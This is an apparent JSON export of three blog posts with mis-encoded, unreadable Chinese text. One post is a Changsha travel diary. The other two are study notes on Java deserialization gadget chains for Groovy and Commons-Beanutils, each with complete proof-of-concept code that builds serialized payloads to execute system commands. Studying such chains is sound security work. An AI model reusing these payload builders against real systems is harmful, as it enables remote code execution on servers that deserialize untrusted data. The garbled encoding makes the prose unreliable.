[{"content":"é•¿æ²™ä¹‹è¡Œ å¯’å‡æ—¶é—´è¿‡é•¿ï¼Œå°å¿åŸçš„åŒé¾„äººåŸºæœ¬ä¸Šå·²ä¸Šå­¦ï¼Œæˆ‘åœ¨å®¶æ— æ‰€äº‹äº‹ï¼Œå½“æˆ‘é¢å¯¹æ¥è‡ªé«˜ä¸­åŒå­¦é•¿æ²™ä¹‹æ—…çš„é‚€è¯·ï¼Œæˆ‘ä¸å‡æ€ç´¢ï¼Œæ”¶æ‹¾è¡Œæï¼Œè´­ä¹°è½¦ç¥¨ï¼Œè¸ä¸Šæ—…é€”ã€‚\nåŒæ¡Œåœ¨é•¿æ²™æŸä¸çŸ¥å985é«˜æ ¡å°±è¯»ï¼Œåœ¨é•¿æ²™ç”Ÿæ´»äº†ä¸‰å¹´ä¹‹å¤šï¼Œå¯ç§°å¾—ä¸Šæ˜¯ç¾é£Ÿè€é¥•å’Œä¸æŠ˜ä¸æ‰£çš„é•¿æ²™åœ°å¤´è›‡äº†ğŸ¶ã€‚\né‰´äºæœ¬äººå®åœ¨æ‹‰èƒ¯çš„æ‘„å½±æŠ€æœ¯ï¼Œç®€å•çš„ç®€è¿°ä¸€ä¸‹é•¿æ²™ä¹‹è¡Œçš„æ„Ÿå—ã€‚\nè‰²å‘³ä¿±ä½³\u0026ndash;ç¾é£Ÿ å‰ä¸¤å¤©ï¼ŒåŒæ¡Œå·²æœ¬åœ°äººçš„å§¿æ€ï¼Œä½œä¸ºå‘å¯¼é¦–å…ˆå¸¦æˆ‘å“å°äº†ä¹…è´Ÿç››åï¼Œé•¿æ²™éåœ°å¼€èŠ±çš„â€œèŒ¶é¢œæ‚¦è‰²â€ï¼Œç¡®å®æ˜¯å€¼å¾—æ‰“å¡çš„é¥®å“ã€‚\nç„¶åå¸¦æˆ‘å°éäº†é•¿æ²™çš„ç‰¹è‰²æ¹˜èœï¼Œå‰æ¤’é±¼å¤´ï¼Œå°ç‚’é»„ç‰›è‚‰ï¼Œç¡®å®æ˜¯é¦™è¾£ä¿±å…¨ï¼Œä¸‹é¥­åˆç¾å‘³ã€‚ä½†å®åœ¨æ˜¯æ²¡æœ‰ç­‰èœä¸Šé½æ‹ç…§çš„é›…å…´ï¼Œå°±ä¸åœ¨æ”¾å›¾äº†ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨é•¿æ²™å°åˆ°äº†å¾ˆå¥½åƒçš„å†°ã€‚\næœ€åæ˜¯é•¿æ²™ä¸ºäººç§°é“çš„å°é¾™è™¾ï¼Œ(_____å°é¾™è™¾åƒå®Œä¹‹åçš„æ±¤æ±å†æ¶®é¢çœŸçš„æ˜¯ç¾å‘³åŠ å€ï¼)\næŒ¥æ–¥æ–¹é’\u0026ndash;å‡ºè¡Œ åœ¨é•¿æ²™ï¼Œé©¬ç‹å †å¢“å‘ï¼Œé•¿æ²™åšç‰©é¦†ï¼Œæ©˜å­æ´²ï¼Œå²³éº“å±±éƒ½ç•™ä¸‹æˆ‘åˆ°è®¿çš„è¡Œè¿¹ã€‚\næ©˜å­æ´²å¯¹æˆ‘çš„æ„Ÿè§‰ç‰¹åˆ«å¤§ï¼Œæœ¬æ¥æ˜¯å†²ç€æ¯›ä¸»å¸­çš„â€œçœ‹ä¸‡å±±çº¢éï¼Œå±‚æ—å°½æŸ“ã€‚â€ï¼Œå¯æƒœæˆ‘æ¥çš„å­£èŠ‚ä¸æ˜¯æ—¶å€™ï¼Œæ˜¯ä¹æš–è¿˜å¯’æ—¶å€™ï¼Œç°åœ¨é•¿æ²™ä¹Ÿæ²¡æœ‰â€œæ¼«æ±Ÿç¢§é€ï¼Œç™¾èˆ¸äº‰æµâ€ï¼Œä½†æ˜¯ç«™åœ¨æ¯›ä¸»å¸­æ›¾ç»ç«™çš„åœ°æ–¹ï¼Œä»¿ä½›è·¨è¶Šç™¾å¹´ï¼Œåˆå›åˆ°äº†é‚£ä¸ªæ•‘äº¡å›¾å­˜çš„å¹´ä»£ï¼Œå¿ƒèƒ¸ä¸€ä¸‹å­å°±å¼€é˜”èµ·æ¥ï¼Œç¡®å®æ˜¯â€œæ€…å¯¥å»“ï¼Œé—®è‹èŒ«å¤§åœ°ï¼Œè°ä¸»æ²‰æµ®ï¼Ÿâ€ï¼Œæ­¤æ—¶æ­¤æ™¯ï¼Œçœ‹ç€æ¹˜æ±ŸåŒ—å»ï¼Œæ€èƒ½ä¸â€œæŒ‡ç‚¹æ±Ÿå±±â€ï¼Œâ€œæŒ¥æ–¥æ–¹é’â€å‘¢ï¼Ÿ\nçš±çœ‰è¹™çœ¼\u0026ndash;åè€Œä¸å® åœ¨æœ‹å‹çš„å†ä¸‰åŠé˜»ä¸‹ï¼Œæˆ‘æ¢è®¿äº†ä¹…è´Ÿç››åçš„å¤ªå¹³è¡—å’Œæ–‡å’Œå‹ã€‚è¿™é‡Œï¼Œäººå±±äººæµ·ï¼Œä½†æ˜¯ä¸€å··ä¹‹éš”å´äººçƒŸç¨€ç–ã€‚é«˜åº¦çš„å•†ä¸šä¸å†·æ¸…çš„ç”Ÿæ´»å¦‚æ­¤ç›¸è¿‘ï¼Œé‡Œé¢çš„å°åƒå¤§éƒ¨åˆ†ä¹Ÿä¸å°½äººæ„ï¼Œæ²¡æœ‰å¤–é¢çš„æ™®é€šäººå®¶æ¥çš„å¥½åƒï¼Œé™·å…¥æ¶ˆè´¹ä¸»ä¹‰é™·é˜±ï¼Œåè€Œä¸å®ã€‚\n","permalink":"http://www.reus09.top/posts/life/%E9%95%BF%E6%B2%99%E4%B9%8B%E8%A1%8C/","summary":"é•¿æ²™ä¹‹è¡Œ å¯’å‡æ—¶é—´è¿‡é•¿ï¼Œå°å¿åŸçš„åŒé¾„äººåŸºæœ¬ä¸Šå·²ä¸Šå­¦ï¼Œæˆ‘åœ¨å®¶æ— æ‰€äº‹äº‹ï¼Œå½“æˆ‘é¢å¯¹æ¥è‡ªé«˜ä¸­åŒå­¦é•¿æ²™ä¹‹æ—…çš„é‚€è¯·ï¼Œæˆ‘ä¸å‡æ€ç´¢ï¼Œæ”¶æ‹¾è¡Œæï¼Œè´­ä¹°è½¦ç¥¨ï¼Œè¸ä¸Šæ—…","title":"é•¿æ²™ä¹‹è¡Œ"},{"content":"å…¶å®å§ï¼Œæç½®äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡æœ‰å­¦ä¹ çš„å¿µå¤´ï¼Œæ·±æ„Ÿç½ªè¿‡ã€‚è¿™é‡Œå°±ç»§ç»­å­¦ä¹ ä¸€ä¸‹Groovyé“¾çš„æ„é€ æ–¹æ³•ï¼Œä¹‹åä¼šæš‚æ—¶å¯¹ååºåˆ—åŒ–é“¾çš„å­¦ä¹ å‘Šä¸€æ®µè½ï¼Œå¯¹ç›®å‰å­¦åˆ°çš„ååºåˆ—åŒ–é“¾è¿›è¡Œäº†ä¸€ä¸ªå›é¡¾ï¼Œæ€»æ˜¯å‘ç°ï¼Œäººçš„é—å¿˜æ—¶æ—¶åˆ»åˆ»éƒ½å­˜åœ¨ç€ã€‚\nGroovy æ˜¯ä¸€ç§åŸºäº JVM çš„å¼€å‘è¯­è¨€ï¼Œå…·æœ‰ç±»ä¼¼äº Pythonï¼ŒRubyï¼ŒPerl å’Œ Smalltalk çš„åŠŸèƒ½ã€‚Groovy æ—¢å¯ä»¥ç”¨ä½œ Java å¹³å°çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¹Ÿå¯ä»¥ç”¨ä½œè„šæœ¬è¯­è¨€ã€‚groovy ç¼–è¯‘ä¹‹åç”Ÿæˆ .class æ–‡ä»¶ï¼Œä¸ Java ç¼–è¯‘ç”Ÿæˆçš„æ— å¼‚ï¼Œå› æ­¤å¯ä»¥åœ¨ JVM ä¸Šè¿è¡Œã€‚\nåœ¨é¡¹ç›®ä¸­å¯ä»¥å¼•ç”¨ Groovy çš„ç›¸å…³åŒ…ä¾èµ–ï¼Œåˆ†ä¸ºæ ¸å¿ƒåŒ…å’Œæ¨¡å—åŒ…ï¼Œå¦‚æœæƒ³ä¾èµ–å…¨éƒ¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨ groovy-allã€‚æœ¬æ¡åˆ©ç”¨ Gadget å°±æ˜¯åœ¨ groovy æ ¸å¿ƒåŒ…ä¸­ã€‚\nå‰æçŸ¥è¯† ç…§å¸¸ï¼Œæˆ‘ä»¬éœ€è¦å­¦ä¹ ä¸€äº›Groovyé“¾éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼Œäº§ç”Ÿæ¼æ´æ”»å‡»çš„ä½ç½®ã€‚\nMethodClosue org.codehaus.groovy.runtime.MethodClosure æ˜¯æ–¹æ³•é—­åŒ…ï¼Œä½¿ç”¨é—­åŒ…ä»£è¡¨äº†ä¸€ä¸ªå¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è°ƒç”¨ã€‚\nMethodClosure åˆå§‹åŒ–æ—¶æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯å¯¹è±¡çš„æ–¹æ³•åç§°ã€‚\nMethodClosure ä¸­æœ‰ä¸€ä¸ª doCall æ–¹æ³•ï¼Œè°ƒç”¨ InvokerHelper.invokeMethod() æ–¹æ³•è¿›è¡Œæ–¹æ³•è°ƒç”¨ã€‚\nè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨MethodClosueæ¥æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤ã€‚\n1 2 3 4 MethodClosure mc = new MethodClosure(Runtime.getRuntime(),\u0026#34;exec\u0026#34;); Method m = MethodClosure.class.getDeclaredMethod(\u0026#34;doCall\u0026#34;,Object.class); m.setAccessible(true); m.invoke(mc,\u0026#34;open -a Calculator.app\u0026#34;); String.execute()æ–¹æ³• Groovy ä¸º String ç±»å‹æ·»åŠ äº† execute() æ–¹æ³•ï¼Œä»¥ä¾¿æ‰§è¡Œ shell å‘½ä»¤ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Process å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ Groovy ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ \u0026quot;ls\u0026quot;.execute() è¿™ç§æ–¹æ³•æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ â€œlsâ€ã€‚\nå†™æ³•éå¸¸ç®€å•ï¼Œä¾‹å¦‚ï¼š\nå®é™…ä¸Šï¼Œexecuteæ–¹æ³•å°±æ˜¯è°ƒç”¨Runtime.getRuntime().exec() æ–¹æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\nå®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è®²string.execute()å°†MethodClosureç»“åˆèµ·æ¥ï¼Œå®ç°æ¼æ´æ”»å‡»\n1 2 3 4 static void main(String[] args) { MethodClosure mc = new MethodClosure(\u0026#34;open -a Calculator.app\u0026#34;,\u0026#34;execute\u0026#34;); mc.call(); } ConvertedClosure org.codehaus.groovy.runtime.ConvertedClosure æ˜¯ä¸€ä¸ªé€šç”¨é€‚é…å™¨ï¼Œç”¨äºå°†é—­åŒ…é€‚é…åˆ° Java æ¥å£ã€‚ConvertedClosure å®ç°äº† ConversionHandler ç±»ï¼Œè€Œ ConversionHandler åˆå®ç°äº† InvocationHandlerã€‚æ‰€ä»¥è¯´ ConvertedClosure æœ¬èº«å°±æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ã€‚\nConvertedClosure çš„æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ª Closure å¯¹è±¡å’Œä¸€ä¸ª String ç±»å‹çš„ method æ–¹æ³•åï¼Œä¹Ÿå°±æ˜¯è¯´ ConvertedClosure ä¼šä»£ç†è¿™ä¸ª Closure å¯¹è±¡ï¼Œå½“è°ƒç”¨å…¶ method æ–¹æ³•æ—¶ï¼Œå°†ä¼šè°ƒç”¨ ConvertedClosure çˆ¶ç±»çš„ invoke æ–¹æ³•ï¼Œé™¤äº† toString å’Œä¸€äº›é»˜è®¤æ–¹æ³•å¤–ï¼Œä¼šè°ƒç”¨ invokeCustom æ–¹æ³•ã€‚\nå¦‚æœåˆå§‹åŒ–æ—¶æŒ‡å®šçš„ method ä¸ invokeCustom æŒ‡å®šçš„ method å‚æ•°ç›¸åŒï¼Œåˆ™ invokeCustom æ–¹æ³•å°†ä¼šè°ƒç”¨ä»£ç†å¯¹è±¡ Closure çš„ call æ–¹æ³•æ‰§è¡Œä¼ å…¥å‚æ•°æ‰§è¡Œã€‚\nçœ‹åˆ°è¿™é‡Œå°±æ˜ç™½è¿™æ¡é“¾çš„è§¦å‘é€»è¾‘äº†ã€‚åé¢è‡ªç„¶æ˜¯ä½¿ç”¨ AnnotationInvocationHandler å°† ConvertedClosure ä»£ç†æˆ Map ç±»ã€‚\næ”»å‡»æ„é€  è¿™é‡Œæƒ³åˆ†æä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦å°†ConvertedClosure closure = new ConvertedClosure(methodClosure, \u0026quot;entrySet\u0026quot;);å°†methodClosureçš„è§¦å‘æ–¹æ³•å˜ä¸ºentrySetã€‚\nå› ä¸ºAnnotationInvocationHandlerä»£ç†äº†ConvertedClosureï¼Œåªæœ‰å½“AnnotationInvocationHandlerä¸­æ‰§è¡Œäº†å’ŒConvertedClosureåˆå§‹åŒ–æ—¶çš„ç›¸åŒå‚æ•°methodæ—¶ï¼Œæ‰ä¼šæ‰§è¡ŒmethodClosureã€‚\nAnnotationInvocationHandleråœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä»£ç†çš„å¯¹è±¡ä¼šæ”¾åœ¨memberValueä¸­ï¼Œç„¶åä¼šæ‰§è¡ŒentrySetæ–¹æ³•ã€‚\næ‰€ä»¥æˆ‘ä»¬ååºåˆ—åŒ–è¿‡ç¨‹ä¸­AnnotationInvocationHandleræ‰§è¡Œäº†entrySetæ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ä»£ç†å¯¹è±¡ConvertedClosureçš„Closureå¯¹è±¡çš„callæ–¹æ³•,æœ€åè§¦å‘Groovyé“¾çš„string.execute()ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 package Groovy; import Util.SeralizeUtil; import org.codehaus.groovy.runtime.ConvertedClosure; import org.codehaus.groovy.runtime.MethodClosure; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Map; /** * @ClassName Groovy * @Description TODO * @Author reus09 * @Date 2022/11/8 22:37 * @Version 1.0 **/ public class Groovy { public static String fileName = \u0026#34;Groovy.bin\u0026#34;; public static void main(String[] args) throws Exception { //å°è£…æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å¯¹è±¡ MethodClosure methodClosure = new MethodClosure(\u0026#34;open -a Calculator.app\u0026#34;, \u0026#34;execute\u0026#34;); ConvertedClosure closure = new ConvertedClosure(methodClosure, \u0026#34;entrySet\u0026#34;); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // åˆ›å»º ConvertedClosure çš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹ Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure); // ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler); // SeralizeUtil.writeObjectToFile(invocationHandler, fileName); SeralizeUtil.readFileObject(fileName); } } æ€»ç»“ ä»¥ä¸Šå°±æ˜¯ Groovy é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š AnnotationInvocationHandler ååºåˆ—åŒ–æ—¶è°ƒç”¨ memberValues ä¸­å­˜æ”¾å¯¹è±¡çš„ entrySet å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ ConvertedClosureï¼Œè€Œè¿™ä¸ªå¯¹è±¡åˆå®é™…ä¸Šæ˜¯ MethodClosure å¯¹è±¡çš„ä»£ç†ï¼Œå®šä¹‰äº†åœ¨è°ƒç”¨ entrySet æ–¹æ³•æ—¶ä¼šè°ƒç”¨ invoke æ–¹æ³•å»è°ƒç”¨ MethodClosure çš„ call æ–¹æ³•ï¼Œè§¦å‘ Groovy ä¸­ String ç±»å‹çš„ execute æ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šsun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadgetï¼šorg.codehaus.groovy.runtime.MethodClosure#doCall() chain gadgetï¼šorg.codehaus.groovy.runtime.ConvertedClosure#invokeCustom() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 AnnotationInvocationHandler.readObject() Map.entrySet() (Proxy) ConversionHandler.invoke() ConvertedClosure.invokeCustom() MethodClosure.call() ProcessGroovyMethods.execute() ä¾èµ–ç‰ˆæœ¬\nGroovy : 1.7.0-2.4.3\n","permalink":"http://www.reus09.top/posts/tech/groovy%E9%93%BE%E5%88%86%E6%9E%90/","summary":"å…¶å®å§ï¼Œæç½®äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡æœ‰å­¦ä¹ çš„å¿µå¤´ï¼Œæ·±æ„Ÿç½ªè¿‡ã€‚è¿™é‡Œå°±ç»§ç»­å­¦ä¹ ä¸€ä¸‹Groovyé“¾çš„æ„é€ æ–¹æ³•ï¼Œä¹‹åä¼šæš‚æ—¶å¯¹ååºåˆ—åŒ–é“¾çš„å­¦ä¹ å‘Šä¸€æ®µè½ï¼Œå¯¹ç›®å‰å­¦","title":"Groovyé“¾åˆ†æ"},{"content":"å®é™…ä¸Šæˆ‘è§‰å¾—åšå®¢å¹¶ä¸æ˜¯åªæ¥è®°å½•ä¸€äº›å­¦ä¹ ã€æŠ€æœ¯ä¸Šçš„æ„Ÿæ‚Ÿï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹çš„ä¸€äº›å¿ƒç†ä¹Ÿæ˜¯å¾ˆæœ‰æ„ä¹‰çš„ã€‚æœ€è¿‘å‡ å¤©ç¡®å®æ˜¯è¿‡äº†ä¸€æ®µæ¯”è¾ƒèˆ’é€‚æ„‰å¿«çš„ç”Ÿæ´»ï¼Œæ‘†çƒ‚çš„æ—¥å­å¯ä»¥è¯´è¿‡äº†ç›¸å½“ä¸€æ®µæ—¶é—´ï¼Œå‰ä¸ä¹…æ„Ÿè§‰è¾ƒä¸ºç®€å•çš„CC7é“¾çš„åˆ†ææ‹–å»¶äº†å¥½é•¿æ—¶é—´ã€‚ä½†æ˜¯ç”Ÿæ´»æ€»æ˜¯è¦å‘å‰çš„ï¼Œä»Šå¤©å°±ç»§ç»­è·Ÿç€su18å¸ˆå‚…ç»§ç»­å­¦ä¹ ååºåˆ—åŒ–çš„çŸ¥è¯†ï¼Œä½†æ˜¯ç°åœ¨è§‰å¾—é™·å…¥äº†æå¤§çš„é‡å¤ã€åˆ†ææ—‹æ¶¡ã€‚\nCommons-Beanutilsæ˜¯Apacheæä¾›çš„ä¸€ä¸ªç”¨äºæ“ä½œJavaBeançš„å·¥å…·åŒ…ã€‚é‡Œé¢æä¾›äº†å„ç§å„æ ·çš„å·¥å…·ç±»ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„å¯¹beanå¯¹è±¡çš„å±æ€§è¿›è¡Œå„ç§æ“ä½œã€‚\nå…¶ä¸­æ¯”è¾ƒå¸¸ä½¿ç”¨çš„æœ‰ MethodUtils/ConstructorUtils/PropertyUtils/BeanUtils/ConvertUtils ç­‰ã€‚\nåœ¨ä¹‹å‰çš„åˆ©ç”¨é“¾ä¸­ï¼Œæœ‰è¿™æ ·ä¸€æ¡é“¾ï¼š\nPriorityQueue -\u0026gt; TransformingComparator -\u0026gt; ChainedTransformer -\u0026gt; InstantiateTransformer -\u0026gt; TemplatesImpl\nåœ¨ååºåˆ—åŒ–é“¾ä¸­ï¼Œç”± TransformingComparator è§¦å‘ ChainedTransformer æ¥å®ä¾‹åŒ– TemplatesImplï¼Œé‚£èƒ½ä¸èƒ½æ‰¾åˆ°ä¸€ä¸ª Comparatorï¼Œç»•è¿‡ä¸­é—´å¤æ‚è¿‡ç¨‹ï¼Œç›´æ¥å®ä¾‹åŒ– TemplatesImpl å‘¢ï¼Ÿ\näºæ˜¯æœ‰äº† CommonsBeanutils è¿™æ¡é“¾ã€‚\nå‰ç½®çŸ¥è¯† é¦–å…ˆï¼Œæˆ‘ä»¬è¿˜æ˜¯éœ€è¦äº†è§£ä¸€äº›å‰ç½®çš„å·¥å…·ç±»ã€‚\nPropertyUtils org.apache.commons.beanutils.PropertyUtils ç±»ä½¿ç”¨ Java åå°„ API æ¥è°ƒç”¨ Java å¯¹è±¡ä¸Šçš„é€šç”¨å±æ€§ getter å’Œ setter æ“ä½œçš„å®ç”¨æ–¹æ³•ã€‚è¿™äº›æ–¹æ³•çš„å…·ä½“ä½¿ç”¨é€»è¾‘å…¶å®æ˜¯ç”± org.apache.commons.beanutils.PropertyUtilsBean æ¥å®ç°çš„ã€‚\nè¿™ä¸ªç±»æœ‰ä¸ªå…±æœ‰é™æ€æ–¹æ³• getProperty() ï¼Œæ¥æ”¶ä¸¤ä¸ªå‚æ•° bean ï¼ˆç±»å¯¹è±¡ï¼‰å’Œ nameï¼ˆå±æ€§åï¼‰ï¼Œæ–¹æ³•ä¼šè¿”å›è¿™ä¸ªç±»çš„è¿™ä¸ªå±æ€§çš„å€¼ã€‚\nç±»ä¼¼äºä¸€ä¸ª Field çš„åå°„å·¥å…·ç±»ï¼Œä¸è¿‡ä¸æ˜¯ç›´æ¥ä½¿ç”¨åå°„å–å€¼ï¼Œè€Œæ˜¯ä½¿ç”¨åå°„è°ƒç”¨å…¶ getter æ–¹æ³•å–å€¼ã€‚\né‚£ä¹ˆæ—¢ç„¶å¯ä»¥è§¦å‘ getterï¼Œé‚£å°±å¯ä»¥åƒ fastjson ä¸€æ ·æ¥è§¦å‘ TemplatesImpl çš„ getOutputProperties æ–¹æ³•ï¼Œè§¦å‘åç»­çš„è°ƒç”¨é“¾ã€‚\nBeanComparator BeanComparator æ˜¯ commons-beanutils æä¾›çš„ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ª JavaBean æ˜¯å¦ç›¸ç­‰çš„ç±»ï¼Œå…¶å®ç°äº†java.util.Comparator æ¥å£ã€‚\nBeanComparator åœ¨åˆå§‹åŒ–æ—¶å¯ä»¥æŒ‡å®š property å±æ€§åç§°å’Œ comparator å¯¹æ¯”å™¨ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œåˆ™é»˜è®¤æ˜¯ ComparableComparator ã€‚\nBeanComparator çš„ compare æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå¯¹è±¡ï¼Œåˆ†åˆ«è°ƒç”¨ PropertyUtils.getProperty() æ–¹æ³•è·å–ä¸¤ä¸ªå¯¹è±¡çš„ property å±æ€§çš„å€¼ï¼Œç„¶åè°ƒç”¨ internalCompare() æ–¹æ³•è°ƒç”¨å®ä¾‹åŒ–æ—¶åˆå§‹åŒ–çš„ comparator çš„ compare æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥å°†PriportyQueueçš„comparaotrè®¾ç½®ä¸ºBeanComparaotr,å°±å¯ä»¥å®ç°getProperty,ä»è€Œæ‰§è¡ŒgetOutputPropertiesï¼Œç„¶ååœ¨getOutputPropertiesæ–¹æ³•ä¸­å®ç°äº†tmplçš„æ¶æ„ç±»ã€‚\næ”»å‡»åˆ©ç”¨ æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œæœ‰å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package CommonBean; import Util.SeralizeUtil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.InputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; /** * @ClassName CommonBeanUtils * @Description TODO * @Author reus09 * @Date 2022/11/4 16:54 * @Version 1.0 **/ public class CommonBeanUtils { public static String fileName = \u0026#34;CommonBeanUtils.bin\u0026#34;; public static void main(String[] args) throws Exception{ // è¯»å–æ¶æ„ç±» byte[] InputStream inputStream = CommonBeanUtils.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // åˆå§‹åŒ–PriorityQueue PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(1); queue.add(2); // åˆå§‹åŒ– TemplatesImpl å¯¹è±¡ TemplatesImpl tmpl = new TemplatesImpl(); Field byteCodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); byteCodes.setAccessible(true); byteCodes.set(tmpl,new byte[][] {bytes}); // _name ä¸ä¸ºç©º Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl,\u0026#34;reus09\u0026#34;); // åå°„å°†TemplatesImpl å¯¹è±¡æ”¾åœ¨ PriorityQueueé‡Œ Field field = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field.setAccessible(true); Object[] objects = (Object[]) field.get(queue); objects[0] = tmpl; // åˆå§‹åŒ–BeanComparator BeanComparator beanComparator = new BeanComparator(\u0026#34;outputProperties\u0026#34;); // åå°„å°† BeanComparator å†™å…¥ PriorityQueueé‡Œ Field field1 = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field1.setAccessible(true); field1.set(queue,beanComparator); SeralizeUtil.writeObjectToFile(queue,fileName); SeralizeUtil.readFileObject(fileName); } } ä»¥ä¸Šä»£ç å¯æˆåŠŸæ„é€ ååºåˆ—åŒ–åˆ©ç”¨ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œç”±äº BeanComparator çš„é»˜è®¤ comparator æ˜¯ ComparableComparator ï¼Œè¿™æ˜¯ä¸ª CommonCollections ä¸­çš„ç±»ï¼Œå¯¼è‡´äº†è¿™æ˜æ˜æ˜¯ä¸€æ¡ CB çš„è§¦å‘é“¾ï¼Œå´è¦åŒæ—¶ä¾èµ– CCã€‚å¢åŠ äº†å¾ˆå¤šåˆ©ç”¨çš„é™åˆ¶ï¼Œé‚£è¯¥å¦‚ä½•é€ƒå‡º CC çš„ä¾èµ–å‘¢ï¼Ÿ\nç­”æ¡ˆåœ¨å®ä¾‹åŒ– BeanComparator æ—¶èµ‹äºˆå…¶ä¸€ä¸ª JDK è‡ªå¸¦çš„å¹¶ä¸”å®ç°äº† Serializable æ¥å£çš„ comparator å³å¯ï¼Œæ¯”å¦‚ java.util.Collections$ReverseComparator å’Œ java.lang.String$CaseInsensitiveComparator ç­‰ã€‚\né€šè¿‡åå°„å®ä¾‹åŒ– Comparator ï¼Œå¹¶åœ¨ BeanComparator åˆå§‹åŒ–æ—¶è¿›è¡ŒæŒ‡å®šå³å¯ï¼š\n1 2 3 4 5 6 7 8 // åˆå§‹åŒ– String$CaseInsensitiveComparator Class c = Class.forName(\u0026#34;java.lang.String$CaseInsensitiveComparator\u0026#34;); Constructor constructor = c.getDeclaredConstructor(); constructor.setAccessible(true); Comparator comparator = (Comparator\u0026lt;?\u0026gt;) constructor.newInstance(); // åˆå§‹åŒ– BeanComparator BeanComparator beanComparator = new BeanComparator(\u0026#34;outputProperties\u0026#34;, comparator); è¿™æ ·å°±å¯ä»¥æ— éœ€ CC çš„ä¾èµ–è§¦å‘ CB é“¾äº†ã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CB é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š PriorityQueue ååºåˆ—åŒ–æ—¶è°ƒç”¨ BeanComparator çš„ compareï¼Œåˆ©ç”¨è¿™ä¸ªæ–¹æ³•å‘å°„è°ƒç”¨ TemplatesImpl çš„ getOutputProperties æ–¹æ³•è§¦å‘æ¶æ„ç±»çš„å®ä¾‹åŒ–ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjava.util.PriorityQueue#readObject() sink gadgetï¼šcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties() chain gadgetï¼šorg.apache.commons.beanutils.BeanComparator#compare() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 PriorityQueue.readObject() BeanComparator.compare() PropertyUtils.getProperty() PropertyUtilsBean.getProperty() TemplatesImpl.getOutputProperties() 